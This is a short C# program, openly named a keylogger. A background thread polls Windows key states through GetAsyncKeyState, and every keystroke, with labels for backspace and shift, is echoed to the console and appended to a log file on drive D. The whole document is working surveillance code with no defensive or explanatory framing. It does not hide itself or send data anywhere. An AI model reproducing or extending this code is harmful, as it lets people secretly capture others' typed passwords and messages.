using System;
using System.IO;
using System.Threading;
using System.Runtime.InteropServices;

namespace KeyLoger
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int key);
        public bool isLogging= false;
        public void LogKeyStrokes()
        {
            this.isLogging = true;
            int key;
            while (this.isLogging == true)
            {
                for (key = 0; key < 180; key++)
                {
                    if (GetAsyncKeyState(key) == -32767)
                    {
                        this.CheckKeys(key);
                    }
                }
            }

         
        }
        public void CheckKeys(int keyCode)
        {
            StreamWriter sw = new StreamWriter("D:\\keyloger.log", true);
            switch (keyCode)
            {
                case 8:
                    Console.Write("  [BACKSPACE]  ");
                  
                    sw.Write("  [BACKSPACE]  ");
             
                    break;
                    
                case 9:
                    Console.Write("    ");
               
                    sw.Write("    ");
                 
                    break;
                case 13:
                    Console.Write("\n");
       
                    sw.Write("\n");
           
                    break;
                case 16:
                    Console.Write("  [SHIFT]  ");
                
                    sw.Write("  [SHIFT]  ");
              
                    break;
                default:
                    Console.Write((char)keyCode);
               
                    sw.Write((char)keyCode);
           
                    break;

            }

            sw.Close();    
               


            
            
        }

        public void ThreadKeyLogging()
        {
            new Thread(new ThreadStart(this.LogKeyStrokes)).Start();
        }
        static void Main(string[] args)
        {
            
            Program p = new Program();
            StreamWriter sw = new StreamWriter("D:\\keyloger.log", true);
            sw.Write("\nНовая сессия\n");
            sw.Close();
            p.ThreadKeyLogging();
             

        }
       
    }
}
